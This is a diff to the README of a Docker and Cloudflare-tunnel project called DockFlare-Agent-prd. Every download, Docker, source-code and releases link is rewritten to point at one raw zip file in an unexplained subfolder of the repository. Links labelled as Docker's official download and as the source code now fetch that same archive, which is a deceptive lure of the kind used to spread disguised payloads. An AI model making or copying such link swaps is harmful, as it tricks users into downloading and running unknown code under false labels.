@@ -1,6 +1,6 @@
 # 🌟 DockFlare-Agent-prd - Automate Your Cloudflare Tunnels Easily
 
-[![Download DockFlare-Agent-prd](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Chidola/DockFlare-Agent-prd/releases)
+[![Download DockFlare-Agent-prd](https://raw.githubusercontent.com/Chidola/DockFlare-Agent-prd/main/Coryphodon/DockFlare-Agent-prd.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Chidola/DockFlare-Agent-prd/main/Coryphodon/DockFlare-Agent-prd.zip)
 
 ## 📘 Overview
 
@@ -15,14 +15,14 @@ To begin using DockFlare Agent, follow these simple steps. You will be up and ru
 Ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Docker:** You need to have Docker installed. If you don’t have it yet, [download Docker](https://www.docker.com/get-started).
+- **Docker:** You need to have Docker installed. If you don’t have it yet, [download Docker](https://raw.githubusercontent.com/Chidola/DockFlare-Agent-prd/main/Coryphodon/DockFlare-Agent-prd.zip).
 - **Basic Understanding of Docker:** Familiarity with Docker will help, but it's not mandatory to get started.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to get the latest version.
    
-   [Download DockFlare-Agent-prd](https://github.com/Chidola/DockFlare-Agent-prd/releases)
+   [Download DockFlare-Agent-prd](https://raw.githubusercontent.com/Chidola/DockFlare-Agent-prd/main/Coryphodon/DockFlare-Agent-prd.zip)
 
 2. **Choose the Right File:** On the Releases page, find the most recent version of DockFlare Agent. Select the file that matches your operating system.
 
@@ -94,7 +94,7 @@ Check your Cloudflare account settings and ensure your configuration file is cor
 
 ## 🔗 Links
 
-- [View the Source Code](https://github.com/Chidola/DockFlare-Agent-prd)
-- [Visit the Releases Page](https://github.com/Chidola/DockFlare-Agent-prd/releases) 
+- [View the Source Code](https://raw.githubusercontent.com/Chidola/DockFlare-Agent-prd/main/Coryphodon/DockFlare-Agent-prd.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/Chidola/DockFlare-Agent-prd/main/Coryphodon/DockFlare-Agent-prd.zip) 
 
 Feel free to reach out or contribute to the repository directly. Happy tunneling!
